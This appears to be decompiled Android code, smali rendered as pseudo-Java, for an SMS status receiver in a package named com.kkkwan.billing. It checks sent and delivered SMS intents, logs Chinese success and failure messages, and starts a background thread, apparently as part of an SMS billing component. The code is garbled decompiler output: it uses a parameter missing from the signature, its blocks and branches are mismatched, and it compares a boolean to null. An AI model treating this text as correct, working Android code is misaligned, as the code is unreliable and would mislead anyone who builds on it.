public class inal extends android.content.BroadcastReceiver {
	 /* # direct methods */
	 public inal ( ) {
		 /* .locals 0 */
		 /* invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V */
		 return;
	 } // .end method
	 /* # virtual methods */
	 public final void onReceive ( android.content.Context p0, android.content.Intent p1 ) {
		 /* .locals 4 */
		 try { // :try_start_0
			 final String v0 = ""; // const-string v0, ""
			 if ( p2 != null) { // if-eqz p2, :cond_0
				 (( android.content.Intent ) p2 ).getAction ( ); // invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
			 } // :cond_0
			 /* new-instance v1, Ljava/lang/StringBuilder; */
			 final String v2 = "SENT_SMS_ACTION"; // const-string v2, "SENT_SMS_ACTION"
			 /* invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
			 (( android.content.Context ) p1 ).getPackageName ( ); // invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
			 (( java.lang.StringBuilder ) v1 ).append ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
			 (( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
			 v1 = 			 (( java.lang.String ) v1 ).equals ( v0 ); // invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
			 /* if-nez v1, :cond_1 */
			 /* new-instance v1, Ljava/lang/StringBuilder; */
			 final String v2 = "DELIVERED_SMS_ACTION"; // const-string v2, "DELIVERED_SMS_ACTION"
			 /* invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
			 (( android.content.Context ) p1 ).getPackageName ( ); // invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
			 (( java.lang.StringBuilder ) v1 ).append ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
			 (( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
			 v1 = 			 (( java.lang.String ) v1 ).equals ( v0 ); // invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
			 if ( v1 != null) { // if-eqz v1, :cond_2
				 final String v1 = "SmsReceiver"; // const-string v1, "SmsReceiver"
				 /* new-instance v2, Ljava/lang/StringBuilder; */
				 final String v3 = "action="; // const-string v3, "action="
				 /* invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
				 (( java.lang.StringBuilder ) v2 ).append ( v0 ); // invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
				 (( java.lang.StringBuilder ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
				 com.kkkwan.billing.h.f .a ( v1,v0 );
				 final String v0 = "SmsReceiver"; // const-string v0, "SmsReceiver"
				 final String v1 = "\u77ed\u4fe1\u6210\u529f\u53d1\u9001\u5230!"; // const-string v1, "\u77ed\u4fe1\u6210\u529f\u53d1\u9001\u5230!"
				 com.kkkwan.billing.h.f .a ( v0,v1 );
				 /* new-instance v0, Ljava/lang/Thread; */
				 /* new-instance v1, Lcom/kkkwan/billing/a/b; */
				 /* invoke-direct {v1, p0, p1}, Lcom/kkkwan/billing/a/b;-><init>(Lcom/kkkwan/billing/a/a;Landroid/content/Context;)V */
				 /* invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V */
				 (( java.lang.Thread ) v0 ).start ( ); // invoke-virtual {v0}, Ljava/lang/Thread;->start()V
			 } // :cond_1
		 } // :goto_0
		 return;
	 } // :cond_2
	 final String v0 = "SmsReceiver"; // const-string v0, "SmsReceiver"
	 final String v1 = "\u53d1\u9001\u77ed\u4fe1\u5931\u8d25!"; // const-string v1, "\u53d1\u9001\u77ed\u4fe1\u5931\u8d25!"
	 com.kkkwan.billing.h.f .a ( v0,v1 );
	 /* :try_end_0 */
	 /* .catch Ljava/lang/Exception; {:try_start_0 ..:try_end_0} :catch_0 */
	 /* :catch_0 */
	 /* move-exception v0 */
	 (( java.lang.Exception ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;
	 com.kkkwan.billing.h.f .a ( v0 );
} // .end method
